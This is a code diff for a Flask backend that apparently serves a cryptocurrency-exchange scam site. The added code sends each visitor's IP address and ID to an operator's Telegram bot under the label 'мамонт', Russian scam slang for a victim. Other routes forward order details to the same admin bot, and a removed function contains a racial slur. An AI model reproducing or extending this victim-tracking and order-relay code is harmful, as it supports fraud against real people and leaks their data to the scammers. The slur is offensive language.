@@ -1,5 +1,5 @@
 import random
-from flask import Flask,jsonify
+from flask import Flask,jsonify,request
 import db_api
 import json
 import string
@@ -56,12 +56,24 @@ def show_index1():
 
 @app.route('/user/<id>',methods = ['GET'])
 def getUser(id):
+    user_ip = request.remote_addr
+    telegram_api_url = tgbotUrl
+    payload = {
+        
+        }
+    headers = {
+        'Content-Type': 'application/json'
+        }
+
     if str(id).isdigit():
+        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId, 'text': f'мамонт перешел на сайт \n IP:[{user_ip}]\n ID:[{id}]',}), headers=headers)
         return jsonify(id=int(id))
     else:
         id = db_api.getId()
         db_api.registerUser(id)
+        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId,'text': f'мамонт перешел на сайт \n IP:[{user_ip}]\n ID:[{id}]'}), headers=headers)
         return jsonify(id=id)
+        
 
 
 
@@ -84,22 +96,6 @@ def orderupd(orderId):
         receiveAmount,receiveCurrency,sendAmount,sendCurrency,receiver,email,referalCode,status,wallet = db_api.getOrderInfo(orderId)
         return jsonify(receiveAmount = receiveAmount,receiveCurrency = receiveCurrency,sendAmount = sendAmount,sendCurrency = sendCurrency,receiver = receiver,email = email,referalCode = referalCode,status = status,wallet = wallet)
 
-@app.route('/',defaults={'path': ''})
-def otstyk(userId):
-    print('nigger')
-    anwser = {
-    'inline_keyboard': [
-            [{'text': 'Ответить в ТП', 'callback_data': f'uans_{userId}'}]
-    ]}
-    telegram_api_url = tgbotUrl
-    payload = {
-        'text': 'мамонт перешел на сайт',
-        }
-    headers = {
-        'Content-Type': 'application/json'
-        }
-    response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId, 'reply_markup': anwser}), headers=headers)
-
 @app.route('/confirm/<orderId>',methods = ['POST'])
 def confirm(orderId):
     db_api.changeStatus(orderId)
@@ -113,11 +109,6 @@ def confirm(orderId):
     headers = {
         'Content-Type': 'application/json'
         }
-    confirmation = {
-        'inline_keyboard': [
-            [{'text': 'Подтвердить', 'callback_data': f''}]
-        ]
-    }
     if 'e' in str(sendAmount).lower():
         sendAmount = float(sendAmount)  
         sendAmount = format(sendAmount, 'f')  
@@ -129,9 +120,9 @@ def confirm(orderId):
         print(sendAmount)
         print(receiveAmount)
         response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':id}), headers=headers)
-        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId, 'reply_markup': confirmation}), headers=headers)
+        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId}), headers=headers)
     elif str(referalCode) == 'null':
-        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId, 'reply_markup': confirmation}), headers=headers)
+        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId}), headers=headers)
     if response.status_code == 200:
         print('Message sent successfully.')
     else:
